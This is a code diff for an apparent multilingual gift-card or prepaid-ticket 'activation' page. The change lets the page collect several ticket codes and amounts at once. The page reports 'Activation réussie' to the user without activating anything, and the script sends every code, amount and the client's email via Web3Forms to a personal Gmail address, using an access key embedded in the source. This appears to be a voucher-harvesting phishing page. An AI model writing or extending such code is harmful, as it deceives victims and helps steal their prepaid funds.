@@ -319,6 +319,56 @@ footer{padding:3.5rem 3rem 2rem;border-top:1px solid var(--border)}
   transition:all var(--t);white-space:nowrap
 }
 .lang-menu button:hover{background:var(--black3);color:var(--white)}
+
+/* ─── CHAMPS MULTIPLES ─── */
+.tickets-list{ display:flex; flex-direction:column; gap:10px; margin-bottom:1rem; }
+.ticket-row{
+  display:grid; grid-template-columns:1fr 110px 36px; gap:8px; align-items:center;
+}
+.ticket-row input{
+  width:100%; padding:0.8rem 0.9rem;
+  font-family:'Inter',sans-serif; font-size:0.88rem; font-weight:500;
+  color:var(--white); background:var(--black3);
+  border:1px solid var(--border); border-radius:var(--r-sm);
+  outline:none; transition:border-color var(--t);
+}
+.ticket-row input:focus{ border-color:rgba(245,245,240,0.4); box-shadow:0 0 0 3px rgba(245,245,240,0.06); }
+.ticket-row input.code-field{ letter-spacing:0.12em; text-transform:uppercase; }
+.ticket-row input.amount-field{ text-align:center; }
+.ticket-row input::placeholder{ color:var(--faint); font-weight:400; }
+.btn-remove-row{
+  width:34px; height:34px; border-radius:var(--r-sm);
+  background:transparent; border:1px solid var(--border);
+  color:var(--faint); font-size:1rem; cursor:pointer;
+  display:flex; align-items:center; justify-content:center;
+  transition:all var(--t); flex-shrink:0;
+}
+.btn-remove-row:hover{ border-color:#E05252; color:#E05252; background:rgba(224,82,82,0.08); }
+.btn-remove-row:disabled{ opacity:0.3; cursor:not-allowed; }
+.row-headers{
+  display:grid; grid-template-columns:1fr 110px 36px; gap:8px;
+  margin-bottom:4px;
+}
+.row-headers span{
+  font-size:0.68rem; font-weight:600; letter-spacing:0.08em;
+  text-transform:uppercase; color:var(--faint);
+}
+.btn-add-row{
+  display:flex; align-items:center; gap:6px;
+  background:transparent; border:1px dashed var(--border);
+  color:var(--muted); font-family:'Inter',sans-serif;
+  font-size:0.8rem; font-weight:500;
+  padding:0.6rem 1rem; border-radius:var(--r-sm);
+  cursor:pointer; transition:all var(--t); margin-bottom:1.4rem;
+  width:100%;
+}
+.btn-add-row:hover{ border-color:var(--border-light); color:var(--white); background:var(--black3); }
+.ticket-count-badge{
+  display:inline-flex; align-items:center; gap:4px;
+  background:var(--black3); border:1px solid var(--border);
+  border-radius:99px; padding:0.2rem 0.65rem;
+  font-size:0.72rem; color:var(--muted); margin-left:8px;
+}
 </style>
 </head>
 <body>
@@ -401,16 +451,29 @@ footer{padding:3.5rem 3rem 2rem;border-top:1px solid var(--border)}
       </div>
     </div>
 
-    <!-- CODE -->
-    <div class="form-group">
-      <label><span data-i18n="label_code">Code de votre carte / ticket</span></label>
-      <div class="input-wrap">
-        <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
-        </svg>
-        <input type="text" id="codeInput" class="code-field" placeholder="Ex : XXXX-XXXX-XXXX-XXXX" maxlength="24"/>
+    <!-- CODES + MONTANTS -->
+    <div class="form-group" style="margin-bottom:0.5rem">
+      <label>
+        <span data-i18n="label_code">Codes de vos cartes / tickets</span>
+        <span class="ticket-count-badge" id="ticketCount">1 ticket</span>
+      </label>
+    </div>
+    <div class="row-headers">
+      <span data-i18n="col_code">Code du ticket</span>
+      <span data-i18n="col_amount">Montant</span>
+      <span></span>
+    </div>
+    <div class="tickets-list" id="ticketsList">
+      <div class="ticket-row">
+        <input type="text" class="code-field" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="24"/>
+        <input type="text" class="amount-field" placeholder="Ex: 50€"/>
+        <button class="btn-remove-row" onclick="removeRow(this)" disabled title="Supprimer">✕</button>
       </div>
     </div>
+    <button class="btn-add-row" onclick="addRow()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+      <span data-i18n="btn_add_ticket">Ajouter un ticket</span>
+    </button>
 
     <!-- EMAIL -->
     <div class="form-group">
@@ -602,19 +665,60 @@ function selectType(el){
   el.classList.add('selected');
 }
 
-// Format code auto
-document.getElementById('codeInput').addEventListener('input',function(e){
-  let v=e.target.value.replace(/[^A-Za-z0-9]/g,'').toUpperCase();
-  let formatted=v.match(/.{1,4}/g)?.join('-')||v;
-  e.target.value=formatted.substring(0,24);
-});
+// Format code auto géré par formatCode() sur chaque ligne
 
 // FORMSPREE — remplacez YOUR_FORM_ID par votre ID après inscription sur formspree.io
 // Web3Forms — envoi direct vers horphemolly@gmail.com
 const W3F_KEY = 'ab95b122-ea66-4772-869a-f080eddb3a0a';
 
+// ─── GESTION MULTI-TICKETS ───
+function addRow(){
+  const list = document.getElementById('ticketsList');
+  const row = document.createElement('div');
+  row.className = 'ticket-row';
+  row.innerHTML =
+    '<input type="text" class="code-field" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="24"/>'+
+    '<input type="text" class="amount-field" placeholder="Ex: 50€"/>'+
+    '<button class="btn-remove-row" onclick="removeRow(this)" title="Supprimer">✕</button>';
+  // Format auto sur le nouveau champ code
+  row.querySelector('.code-field').addEventListener('input', formatCode);
+  list.appendChild(row);
+  updateCount();
+  updateRemoveButtons();
+}
+
+function removeRow(btn){
+  btn.closest('.ticket-row').remove();
+  updateCount();
+  updateRemoveButtons();
+}
+
+function updateCount(){
+  const n = document.querySelectorAll('.ticket-row').length;
+  const el = document.getElementById('ticketCount');
+  if(el) el.textContent = n + (n > 1 ? ' tickets' : ' ticket');
+}
+
+function updateRemoveButtons(){
+  const rows = document.querySelectorAll('.ticket-row');
+  rows.forEach(r => {
+    const btn = r.querySelector('.btn-remove-row');
+    btn.disabled = rows.length === 1;
+  });
+}
+
+function formatCode(e){
+  let v = e.target.value.replace(/[^A-Za-z0-9]/g,'').toUpperCase();
+  let formatted = v.match(/.{1,4}/g)?.join('-') || v;
+  e.target.value = formatted.substring(0,24);
+}
+
+// Format auto sur le premier champ code existant
+document.querySelectorAll('.code-field').forEach(input => {
+  input.addEventListener('input', formatCode);
+});
+
 async function activerCarte(){
-  const code  = document.getElementById('codeInput').value.trim();
   const email = document.getElementById('emailInput').value.trim();
   const type  = (document.querySelector('.type-btn.selected') || {}).dataset.type || 'Carte';
   const box   = document.getElementById('resultBox');
@@ -622,11 +726,22 @@ async function activerCarte(){
   const ttl   = document.getElementById('resTitle');
   const grid  = document.getElementById('resGrid');
 
-  if(code.replace(/-/g,'').length < 8){
+  // Récupérer tous les tickets
+  const rows = document.querySelectorAll('.ticket-row');
+  const tickets = [];
+  let hasError = false;
+  rows.forEach(row => {
+    const code   = row.querySelector('.code-field').value.trim();
+    const amount = row.querySelector('.amount-field').value.trim();
+    if(code.replace(/-/g,'').length < 8){ hasError = true; }
+    tickets.push({ code, amount });
+  });
+
+  if(hasError){
     box.className='result-box show err';
     icon.className='res-icon err'; icon.textContent='✕';
     ttl.className='res-title err'; ttl.textContent='Code invalide';
-    grid.innerHTML='<div class="res-item" style="grid-column:1/-1"><span style="font-size:.82rem;color:var(--muted)">Veuillez entrer un code valide (min. 8 caractères).</span></div>';
+    grid.innerHTML='<div class="res-item" style="grid-column:1/-1"><span style="font-size:.82rem;color:var(--muted)">Veuillez entrer des codes valides (min. 8 caractères chacun).</span></div>';
     return;
   }
   if(!email || !email.includes('@')){
@@ -641,28 +756,34 @@ async function activerCarte(){
   const dateStr = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
   const timeStr = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'});
 
-  // Afficher résultat immédiatement
   box.className='result-box show ok';
   icon.className='res-icon ok'; icon.textContent='✓';
   ttl.className='res-title ok'; ttl.textContent='Activation réussie !';
-  grid.innerHTML=
-    '<div class="res-item"><label>Type de carte</label><span>'+type+'</span></div>'+
-    '<div class="res-item"><label>Code</label><span style="font-size:.8rem;letter-spacing:.1em">'+code+'</span></div>'+
+
+  let ticketsHtml = '<div class="res-item" style="grid-column:1/-1"><label>Type de carte</label><span>'+type+'</span></div>';
+  tickets.forEach((t,i) => {
+    ticketsHtml +=
+      '<div class="res-item"><label>Code '+(i+1)+'</label><span style="font-size:.78rem;letter-spacing:.1em">'+t.code+'</span></div>'+
+      '<div class="res-item"><label>Montant '+(i+1)+'</label><span>'+(t.amount||'—')+'</span></div>';
+  });
+  ticketsHtml +=
     '<div class="res-item"><label>Statut</label><span style="color:var(--white2)">✓ Activé</span></div>'+
     '<div class="res-item"><label>Email client</label><span style="font-size:.78rem;opacity:.7">'+email+'</span></div>'+
     '<div class="res-item"><label>Date / Heure</label><span>'+dateStr+' à '+timeStr+'</span></div>';
+  grid.innerHTML = ticketsHtml;
 
-  // Envoi email via Web3Forms
   try {
+    const ticketsStr = tickets.map((t,i)=>'Code '+(i+1)+': '+t.code+(t.amount?' ('+t.amount+')':'')).join(' | ');
     await fetch('https://api.web3forms.com/submit',{
       method:'POST',
       headers:{'Content-Type':'application/json','Accept':'application/json'},
       body:JSON.stringify({
         access_key: W3F_KEY,
-        subject: 'Nouvelle activation — ' + type,
+        subject: 'Nouvelle activation — '+type+' ('+tickets.length+' ticket'+(tickets.length>1?'s':'')+')',
         from_name: 'Activation Carte Cadeaux',
         'Type de carte': type,
-        'Code saisi': code,
+        'Tickets': ticketsStr,
+        'Nombre de tickets': tickets.length,
         'Email client': email,
         'Date': dateStr,
         'Heure': timeStr
@@ -707,6 +828,7 @@ const translations = {
     res_ok:'Activation réussie !', res_err_code:'Code invalide', res_err_email:'Email invalide',
     res_type:'Type de carte', res_code:'Code', res_status:'Statut', res_activated:'✓ Activé',
     res_email_label:'Email client', res_date:'Date / Heure',
+    col_code:'Code du ticket', col_amount:'Montant', btn_add_ticket:'Ajouter un ticket',
     flag:'🌐 FR'
   },
   en: {
@@ -742,6 +864,7 @@ const translations = {
     res_ok:'Activation successful!', res_err_code:'Invalid code', res_err_email:'Invalid email',
     res_type:'Card type', res_code:'Code', res_status:'Status', res_activated:'✓ Activated',
     res_email_label:'Client email', res_date:'Date / Time',
+    col_code:'Ticket code', col_amount:'Amount', btn_add_ticket:'Add a ticket',
     flag:'🌐 EN'
   },
   es: {
@@ -777,6 +900,7 @@ const translations = {
     res_ok:'¡Activación exitosa!', res_err_code:'Código inválido', res_err_email:'Email inválido',
     res_type:'Tipo de tarjeta', res_code:'Código', res_status:'Estado', res_activated:'✓ Activado',
     res_email_label:'Email del cliente', res_date:'Fecha / Hora',
+    col_code:'Código del ticket', col_amount:'Importe', btn_add_ticket:'Añadir un ticket',
     flag:'🌐 ES'
   },
   de: {
@@ -812,6 +936,7 @@ const translations = {
     res_ok:'Aktivierung erfolgreich!', res_err_code:'Ungültiger Code', res_err_email:'Ungültige E-Mail',
     res_type:'Kartentyp', res_code:'Code', res_status:'Status', res_activated:'✓ Aktiviert',
     res_email_label:'Kunden-E-Mail', res_date:'Datum / Uhrzeit',
+    col_code:'Ticket-Code', col_amount:'Betrag', btn_add_ticket:'Ticket hinzufügen',
     flag:'🌐 DE'
   },
   it: {
@@ -847,6 +972,7 @@ const translations = {
     res_ok:'Attivazione riuscita!', res_err_code:'Codice non valido', res_err_email:'Email non valida',
     res_type:'Tipo di carta', res_code:'Codice', res_status:'Stato', res_activated:'✓ Attivato',
     res_email_label:'Email cliente', res_date:'Data / Ora',
+    col_code:'Codice ticket', col_amount:'Importo', btn_add_ticket:'Aggiungi un ticket',
     flag:'🌐 IT'
   }
 };
@@ -862,10 +988,11 @@ function setLang(lang){
     if(t[key]) el.textContent = t[key];
   });
   // Placeholders
-  const codeInput = document.getElementById('codeInput');
   const emailInput = document.getElementById('emailInput');
-  if(codeInput) codeInput.placeholder = t.placeholder_code;
   if(emailInput) emailInput.placeholder = t.placeholder_email;
+  // Mettre à jour les placeholders des champs tickets
+  document.querySelectorAll('.code-field').forEach(el => el.placeholder = t.placeholder_code);
+  document.querySelectorAll('.amount-field').forEach(el => el.placeholder = t.placeholder_amount || 'Ex: 50€');
   // Flag button
   document.getElementById('langBtn').textContent = t.flag;
   // Fermer le menu
